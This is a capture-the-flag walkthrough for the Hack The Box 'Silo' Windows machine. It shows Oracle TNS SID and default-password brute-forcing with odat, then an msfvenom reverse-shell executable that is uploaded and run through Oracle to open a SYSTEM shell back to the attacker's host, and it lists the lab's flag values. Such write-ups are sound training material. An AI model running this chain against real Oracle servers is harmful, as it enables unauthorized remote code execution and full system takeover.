# Silo
>Author : Xyan1d3
>Date : 29th June 2021
>IP : 10.10.10.82
>OS : Windows
>Difficulty : Easy

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Tue Jun 29 12:56:28 2021 as: nmap -sC -sV -v -oN nmap/silo 10.10.10.82
Nmap scan report for 10.10.10.82
Host is up (0.14s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-29T07:28:57
|_  start_date: 2021-06-29T07:24:34
```

We could use `crackmapexec` with no credentials to identify the OS running here.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # crackmapexec smb 10.10.10.82
SMB         10.10.10.82     445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
```

We see that we are up against a `Windows Server 2012 R2 Standard 9600 x64`.

## SMB Enumeration
We try to do a null session attack to list all th available shares but, it does not allow us to do so.

## RPC Enumeration
RPC Null Session attack also didn't work.

## Oracle TNS Listener Enumeration
We start poking at the `1521/tcp` which nmap states as unauthorized.

After, Little bit of searching we find out a tool called `odat` which could help us to enumerate the port.
Source : https://github.com/quentinhardy/odat/releases

We could run a `sid` bruteforce to identify any valid users of the box.
Command Run : `./odat-libc2.12-x86_64 sidguesser -s 10.10.10.82`
![[Pasted image 20210629133529.png]]

We find out a valid SID `XE` we could now use `odat` to bruteforce the password of the user.

Now, We have to bruteforce credentials for the SID of the database. For, This we would need a username and password list which we will be using from metasploit. The default file location on kali is `/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt`. 
The wordlist needs to be modified from space separated credentials pair to `/` seperated credential pair.
We use `odat` passwordguesser feature to get the valid password.
![[Pasted image 20210629143119.png]]

Oracle Database : 
|SID|Username|Password|
|--|--|--|
|XE|scott|tiger|

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # ./odat-libc2.12-x86_64/odat-libc2.12-x86_64 --help                         

*** SNIP ***

    externaltable     to read files or to execute system commands/scripts

    utlfile           to download/upload/delete files
*** SNIP ***
```

We could use `utlfile` feature to upload a reverse shell .exe file generated with `msfvenom` and then use `externaltable` to execute the file and get a shell on the box.

We generate a reverse shell executable using `msfvenom`.
```
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=8888 -f exe -o magisk.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: magisk.exe
```

We upload the reverse shell `magisk.exe` on the `/temp` directory.
```
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # ./odat-libc2.12-x86_64/odat-libc2.12-x86_64 utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile /temp magisk.exe magisk.exe

[1] (10.10.10.82:1521): Put the magisk.exe local file in the /temp folder like magisk.exe on the 10.10.10.82 server
[+] The magisk.exe file was created on the /temp directory on the 10.10.10.82 server like the magisk.exe file
```

Now, Time to execute the file using `odat`.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # ./odat-libc2.12-x86_64/odat-libc2.12-x86_64 externaltable --sysdba -s 10.10.10.82 -U scott -P tiger -d XE --exec /temp magisk.exe

[1] (10.10.10.82:1521): Execute the magisk.exe command stored in the /temp path

──────────────────────────────────────────────────────────────────────────────────

┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/silo]
└──╼ # nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.10.82 49163
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
whoami
nt authority\system
```
![[Pasted image 20210629213227.png]]

## Getting the User.txt
We could get the `user.txt` by visiting the `C:\Users\Phineas\Desktop\`.
```python
C:\Users\Phineas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 78D4-EA4D

 Directory of C:\Users\Phineas\Desktop

01/07/2018  03:03 PM    <DIR>          .
01/07/2018  03:03 PM    <DIR>          ..
01/05/2018  11:56 PM               300 Oracle issue.txt
01/04/2018  10:41 PM                32 user.txt
               2 File(s)            332 bytes
               2 Dir(s)  15,522,082,816 bytes free

C:\Users\Phineas\Desktop>type user.txt
type user.txt
92ede778a1cc8d27cb6623055c331617
```

## Getting the Root.txt
We could get the `root.txt` by visiting `C:\Users\Administrator\Desktop`.
```python
C:\Users\Phineas\Desktop>cd ../../Administrator/Desktop
cd ../../Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 78D4-EA4D

 Directory of C:\Users\Administrator\Desktop

01/07/2018  02:34 PM    <DIR>          .
01/07/2018  02:34 PM    <DIR>          ..
01/04/2018  12:38 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,522,078,720 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
cd39ea0af657a495e33bc59c7836faf6

```